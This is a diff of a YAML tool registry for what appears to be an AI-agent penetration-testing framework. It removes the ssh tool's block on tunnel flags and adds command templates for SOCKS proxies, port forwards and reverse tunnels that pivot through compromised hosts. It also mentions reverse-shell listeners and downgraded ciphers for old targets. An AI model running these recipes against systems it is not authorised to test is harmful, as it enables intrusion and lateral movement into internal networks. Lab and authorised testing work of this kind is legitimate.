       reason: Use `nc` (v2.0, May 2026) for raw-TCP REVERSE SHELL holding from an exploit — when there are no SSH credentials
         yet. This `ssh` tool requires known credentials. The `nc` tool's held-listener pipeline pattern (tail|ncat with cmd_log/out_log)
         covers shell-session's listen / shell_exec / upgrade_shell methods. Once a foothold yields SSH credentials, pivot
         from `nc` reverse-shell to `ssh` ControlMaster for a more stable persistent session.
-    - tool: tunnel
-      reason: Use tunnel (kind:mcp) for SSH-based port forwarding (-L local, -R remote, -D dynamic / SOCKS) and stateful tunnels.
-        The `-L`, `-R`, `-D`, and `-N` flags are REJECTED by this `ssh` tool's reject_flags because they require a long-running
-        ssh process; cli_in_container's one-shot model can't keep them alive.
+    - tool: chisel
+      reason: Use `chisel` (kind:mcp) for HTTP-based tunneling when SSH is blocked / unavailable but HTTP is open. ssh-based
+        tunneling (now lifted from reject_flags as of v3.0, May 2026) is in scope HERE via Patterns T1/T2/T3; use chisel as
+        the SSH-unavailable fallback. The legacy `tunnel` (kind:mcp) tool was retired May 2026 — its 5 SSH-tunneling methods
+        now live in this tool.
     - tool: hydra
       reason: Use hydra ssh://host for credential brute-forcing or password spraying. This `ssh` tool requires KNOWN credentials
         (key or password); hydra discovers them. Once hydra surfaces a working pair, hand them to ssh / scp for one-shot exec
@@ -20355,21 +20365,18 @@ tools:
       pattern: ^([^@\s]+@)?([^:/?#\s]+)
       group: 2
       parse_as: raw
-    reject_flags:
-    - -L
-    - -R
-    - -D
-    - -N
-    - -W
-    reject_flags_reason: 'ssh -L, -R, -D, -N, -W are STATEFUL TUNNEL operations: they require the ssh process to keep running
-      for the duration of the tunnel / port forward. For persistent tunneling / port forwarding / SOCKS, use the dedicated
-      `tunnel` (kind:mcp) tool.
+    reject_flags: []
+    reject_flags_reason: 'TUNNEL FLAGS (-L, -R, -D, -N, -W) lifted in v3.0 (Phase A, May 2026). Previously rejected as stateful
+      and routed to the `tunnel` (kind:mcp) tool — but the ControlMaster pattern (introduced in v2.0 / Tool 3) makes them
+      work cleanly. The master container holds the SSH connection for max_runtime_seconds; tunnels established within that
+      connection ride the same socket and are reachable from other tool-runner spawns (plugin defaults to --network=host per
+      src/container/manager.ts:382). See usage_patterns T1/T2/T3 + tunnel gotchas.
 
-      ControlMaster flags (-M, -S, -O) are NOW ALLOWED (v2.0 consolidation, May 2026). The previous restriction reflected
-      a one-shot kind:cli model that pre-dated the tool-runner architecture. Persistent SSH sessions now run via ControlMaster
-      + ControlPath pointed at /session/output/sshctl/ — a master container holds the connection for max_runtime_seconds;
-      separate tool-runner spawns reuse the socket via ControlPath without re-authenticating. See usage_patterns and gotchas
-      for the canonical recipes.
+      CONTROLMASTER FLAGS (-M, -S, -O) lifted in v2.0 (Tool 3, May 2026). Previously rejected as stateful — see ControlMaster
+      usage_patterns + gotchas for the persistent-session pattern.
+
+      Both retired tools (`tunnel` kind:mcp + `shell-session` kind:mcp) had their methods absorbed here; both directories
+      were deleted in the retirement commits.
 
       '
     value_flags:
@@ -20610,6 +20617,36 @@ tools:
         silently misses the master. Optional — master also exits when ControlPersist expires (default in our pattern: 600s
         after last client) or its container is killed by max_runtime_seconds. Use this when the agent wants to free resources
         earlier.'
+    - name: Tunnel — local port forward (replaces tunnel.forward)
+      binary: bash
+      command: -c 'mkdir -p /session/output/sshctl && sshpass -p "<password>" ssh -fN -L <local_port>:<remote_host>:<remote_port>
+        -o ControlMaster=auto -o ControlPersist=<seconds> -o ControlPath=/session/output/sshctl/%h-%p-%r -o StrictHostKeyChecking=no
+        -o UserKnownHostsFile=/dev/null -p <ssh_port> <ssh_user>@<ssh_host>'
+      when: 'Open an SSH local-port-forward tunnel: traffic to <local_port> on the agent''s container is forwarded through
+        the SSH host to <remote_host>:<remote_port>. <remote_host>=''127.0.0.1'' = SSH host''s localhost (most common for
+        accessing localhost-only services like MySQL on 127.0.0.1:3306). For internal-network pivoting, set <remote_host>
+        to an internal IP the SSH host can reach. -fN forks the master + tunnel to background and exits the foreground process
+        so cli_in_container returns. Plugin defaults to --network=host so <local_port> is reachable from other tool-runner
+        spawn containers. Use <local_port>=0 for OS-assigned ephemeral port (capture from -v stderr). For key auth, swap sshpass+"-p
+        PASS" for "-i /session/output/keys/<keyfile>". Verified empirically 2026-05-09 (Test C series).'
+    - name: Tunnel — dynamic SOCKS5 proxy (replaces tunnel.socks)
+      binary: bash
+      command: -c 'mkdir -p /session/output/sshctl && sshpass -p "<password>" ssh -fN -D <local_port> -o ControlMaster=auto
+        -o ControlPersist=<seconds> -o ControlPath=/session/output/sshctl/%h-%p-%r -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
+        -p <ssh_port> <ssh_user>@<ssh_host>'
+      when: 'Open an SSH dynamic SOCKS5 proxy on <local_port> (default 1080). All traffic through the proxy is tunneled to
+        the SSH host and exits from there. Use for full-network pivoting — any tool that supports SOCKS5 reaches any host
+        the SSH host can reach. Tools that consume the proxy: `proxychains -f /tmp/pc.conf nmap ...` with `socks5 127.0.0.1
+        <local_port>` in pc.conf, or `curl --socks5 127.0.0.1:<local_port> ...`, or sqlmap''s `--proxy=socks5://127.0.0.1:<local_port>`.
+        Plugin --network=host makes <local_port> reachable from other tool-runner containers.'
+    - name: Tunnel — remote port forward (replaces tunnel implicit -R)
+      binary: bash
+      command: -c 'sshpass -p "<password>" ssh -fN -R <remote_port>:<local_host>:<local_port> -o ControlMaster=auto -o ControlPath=/session/output/sshctl/%h-%p-%r
+        -o StrictHostKeyChecking=no -p <ssh_port> <ssh_user>@<ssh_host>'
+      when: 'Reverse tunnel — opens <remote_port> on the SSH server side, forwarding incoming connections to <local_host>:<local_port>
+        (relative to the agent''s container). Useful when an internal host can reach the SSH server but not the agent directly:
+        open the reverse tunnel, then point the internal host at SSHHOST:<remote_port>. NOTE: the SSH server''s sshd_config
+        must have GatewayPorts=yes for the remote_port to bind to non-localhost (otherwise bound only to SSH server''s loopback).'
     output_formats:
     - flag: ''
       format: text
@@ -20799,6 +20836,35 @@ tools:
       -S whoami 2>&1''` — sudo''s own -S flag handles stdin, no PTY needed. (c) NOPASSWD: `ssh -o ControlPath=... user@host
       ''sudo -n cmd''` — cleanest, no PTY, no password. CAVEAT: PTY mode pollutes stdout with carriage returns + terminal
       control codes — pipe through `tr -d ''\r''` or omit -tt when output cleanliness matters.'
+    - 'TUNNEL FLAGS now in scope (v3.0, May 2026) — -L, -R, -D, -N, -W formerly rejected as stateful (routed to retired `tunnel`
+      (kind:mcp) tool). The ControlMaster pattern (introduced in v2.0 / Tool 3) makes them work cleanly: the master container
+      holds the SSH connection and the tunnel for max_runtime_seconds, separate tool-runner spawns reuse the socket via ControlPath.
+      WARNING: `-fN` (fork to background, no command) is the preferred form — the master detaches inside the container and
+      the foreground process exits, allowing cli_in_container to return. Without `-fN`, the call blocks for the full ControlPersist
+      duration. Verified against legacy `tunnel` tool''s behavior.'
+    - 'SOCKS PROXY portability — port 1080 (default for Pattern T2) on the agent''s container is reachable from OTHER tool-runner
+      spawn containers IFF plugin uses --network=host (which is the default per src/container/manager.ts:382). For proxychains:
+      agent in container B does `proxychains -f /tmp/pc.conf nmap ...` where pc.conf has `socks5 127.0.0.1 1080`. Verify with
+      `nc -zv localhost 1080` from a separate spawn before trusting the route. SAME applies to local-port-forward (Pattern
+      T1): the forwarded port is reachable from sibling spawns under host networking.'
+    - 'TUNNEL TEARDOWN granularity — closing the master via Pattern D (`ssh -O exit`) kills the master AND ALL of its tunnels
+      at once. For per-tunnel teardown without dropping the SSH connection: `ssh -O cancel -L <local_port>:<remote_host>:<remote_port>
+      -o ControlPath=/session/output/sshctl/%h-%p-%r -p <port> <user>@<host>` removes ONE specific forward. For SOCKS/dynamic:
+      `ssh -O cancel -D <local_port> -o ControlPath=... -p <port> <user>@<host>`. Replaces the tunnel.close vs tunnel.close_all
+      distinction — `-O cancel` is per-tunnel close, `-O exit` is close_all.'
+    - 'MULTIPLE TUNNELS via ONE master — once the ControlMaster Pattern A has run, additional tunnel calls through the same
+      ControlPath ride the existing connection. To add a tunnel mid-session: `ssh -O forward -L <lport>:<rhost>:<rport> -o
+      ControlPath=/session/output/sshctl/%h-%p-%r -p <port> <user>@<host>`. Adds the forward without opening a new SSH connection
+      — sub-second. Useful for incremental tunnel discovery during pivoting (find a service, open a forward; find another,
+      add another forward).'
+    - 'CONTROLMASTER + ANCIENT SSHD (pre-OpenSSH 5.6, pre-2010 targets): the -fN ControlMaster pattern may exit during userauth
+      before creating the socket file. Symptom: container shows ssh process exited cleanly, /session/output/sshctl/ remains
+      empty. Root cause likely OpenSSH 10 client behavior differences with very old sshd implementations. Verified failure
+      against HTB Lame (Ubuntu 8.04, OpenSSH 4.7p1) 2026-05-10 — the -fN ssh exits silently after sending password packet.
+      Fall back to per-call one-shot ssh for these targets: `ssh -o HostKeyAlgorithms=+ssh-rsa -o KexAlgorithms=+diffie-hellman-group1-sha1
+      -o PubkeyAcceptedKeyTypes=+ssh-rsa -o Ciphers=+aes128-cbc user@target ''cmd''`. One-shot exec works fine even on 2007-era
+      sshd. Detection heuristic: ssh banner like `OpenSSH_4.x` → skip ControlMaster, do per-call ssh. Modern targets (OpenSSH
+      7+) unaffected.'
     failure_signatures:
     - signal: Could not resolve hostname
       remediation: 'DNS lookup failed. Check the hostname spelling, verify /etc/hosts inside the container has the mapping
@@ -23331,181 +23397,6 @@ tools:
       purpose: HuggingFace sub-command flag reference (--model, --space, --user, --token).
     - command: gitlab --help
       purpose: GitLab sub-command flag reference (--repo, --token, --endpoint for self-hosted).
-  tunnel:
-    name: tunnel
-    version: '1.0'
-    description: 'SSH tunnel and SOCKS5 proxy manager for accessing remote localhost-only services and pivoting into internal
-      networks. 5 methods: forward (local port forwarding via ''ssh -L''), socks (dynamic port forwarding via ''ssh -D'' for
-      SOCKS5 proxy), list (show active tunnels), close (stop one tunnel), close_all (cleanup). Tunnels run as background SSH
-      processes managed by PID. Supports password (sshpass) and private key authentication. Auto-assigns local ports when
-      local_port=0. Requires host network mode so tunnels are accessible from other MCP containers.'
-    image: ghcr.io/silicon-works/mcp-tools-tunnel:latest
-    image_size_mb: 100
-    timeout_seconds: 600
-    service: true
-    service_name: tunnel
-    capabilities:
-    - port_forwarding
-    - socks_proxy
-    - pivoting
-    - tunnel_management
-    phases:
-    - post-exploitation
-    requirements:
-      network: true
-      privileged: false
-      network_mode: host
-      network_mode_reason: Tunnels must be accessible from other containers
-    resources:
-      memory_mb: 128
-      cpu: 0.25
-    routing:
-      use_for:
-      - forward remote localhost-only port to local port via SSH
-      - create SOCKS5 proxy through SSH for pivoting to internal network
-      - access MySQL or web apps bound to 127.0.0.1 on remote host
-      - pivot through compromised host to reach internal machines
-      - tunnel traffic through SSH to bypass firewall rules
-      never_use_for:
-      - direct SSH command execution (use ssh)
-      - port scanning through tunnel (use nmap with proxychains)
-      - file transfer (use ssh copy_to/copy_from)
-      triggers:
-      - tunnel
-      - port forward
-      - SOCKS
-      - pivot
-      - proxy
-      - internal network
-      - localhost service
-      - ssh -L
-      - ssh -D
-      prefer_over:
-      - ssh
-    see_also:
-    - tool: chisel
-      reason: Use chisel for HTTP-based tunneling when SSH is blocked or unavailable. Chisel tunnels through HTTP/HTTPS proxies.
-    methods:
-      forward:
-        description: Create an SSH local port forward (ssh -L) that maps a local port to a remote host:port through the SSH
-          connection. Traffic to localhost:<local_port> is tunneled through the SSH server and forwarded to <remote_host>:<remote_port>.
-          Runs as a background SSH process. Use local_port=0 for auto-assignment.
-        when_to_use: 'To access services bound to 127.0.0.1 on the target that aren''t exposed externally. Common scenarios:
-          (1) MySQL on 127.0.0.1:3306 — forward to local port, then use mysql tool against localhost, (2) Web apps on 127.0.0.1:8080
-          — forward to local port, then browse with curl/playwright, (3) Internal admin panels, Redis (6379), MongoDB (27017),
-          etc. Also works for reaching services on internal machines through the SSH host by setting remote_host to the internal
-          IP.'
-        params:
-          ssh_host:
-            type: string
-            required: true
-            description: SSH server to tunnel through.
-          ssh_user:
-            type: string
-            required: true
-            description: SSH username.
-          ssh_password:
-            type: string
-            description: SSH password.
-          ssh_key:
-            type: string
-            description: SSH private key content (PEM or OpenSSH format).
-          ssh_port:
-            type: integer
-            default: 22
-            description: SSH server port.
-          remote_host:
-            type: string
-            default: 127.0.0.1
-            description: Host to forward to (from SSH server's perspective). Default '127.0.0.1' for localhost services. Set
-              to internal IP for pivoting.
-          remote_port:
-            type: integer
-            required: true
-            description: Port on remote_host to forward to (e.g., 3306 for MySQL, 8080 for web app).
-          local_port:
-            type: integer
-            default: 0
-            description: Local port to listen on. 0=auto-assign an available port.
-        returns:
-          tunnel_id:
-            type: string
-            description: Tunnel ID for list and close.
-          local_port:
-            type: integer
-            description: Local port the tunnel is listening on (use this to connect).
-          connect_to:
-            type: string
-            description: Address to connect to (e.g., '127.0.0.1:9999').
-      socks:
-        description: Create a SOCKS5 proxy via SSH dynamic port forwarding (ssh -D). All traffic sent through the SOCKS proxy
-          is tunneled through the SSH server and exits from the SSH server's network. Enables full network pivoting — any
-          tool that supports SOCKS5 can reach internal hosts.
-        when_to_use: 'When you need to access multiple services on an internal network through a compromised host. Instead
-          of creating individual port forwards, a SOCKS proxy lets you reach ANY internal host:port. Use with proxychains
-          or tool-specific SOCKS settings. Common scenario: compromised DMZ host → SOCKS proxy → scan/exploit internal network.
-          Default port 1080.'
-        params:
-          ssh_host:
-            type: string
-            required: true
-            description: SSH server to create SOCKS proxy through.
-          ssh_user:
-            type: string
-            required: true
-            description: SSH username.
-          ssh_password:
-            type: string
-            description: SSH password.
-          ssh_key:
-            type: string
-            description: SSH private key content.
-          ssh_port:
-            type: integer
-            default: 22
-            description: SSH server port.
-          local_port:
-            type: integer
-            default: 1080
-            description: Local port for SOCKS5 proxy.
-        returns:
-          tunnel_id:
-            type: string
-            description: Tunnel ID for list and close.
-          proxy_url:
-            type: string
-            description: SOCKS5 proxy URL (e.g., 'socks5://127.0.0.1:1080').
-      list:
-        description: List all active SSH tunnels and SOCKS proxies with their type, ports, SSH host, and process status.
-        when_to_use: To check which tunnels are running, verify a tunnel is still alive, or find the local port for a tunnel.
-        params: {}
-        returns:
-          tunnels:
-            type: array
-            description: 'Active tunnels with: id, type (forward/socks), local_port, remote details, ssh_host.'
-          count:
-            type: integer
-            description: Number of active tunnels.
-      close:
-        description: Close a specific tunnel by killing its background SSH process.
-        when_to_use: When a specific tunnel is no longer needed. Frees the local port for reuse.
-        params:
-          tunnel_id:
-            type: string
-            required: true
-            description: Tunnel ID to close.
-        returns:
-          tunnel_id:
-            type: string
-            description: ID of the closed tunnel.
-      close_all:
-        description: Close all active tunnels and SOCKS proxies.
-        when_to_use: At the end of an engagement or when resetting the network setup.
-        params: {}
-        returns:
-          closed:
-            type: array
-            description: List of closed tunnel IDs.
   volatility:
     name: volatility
     kind: cli
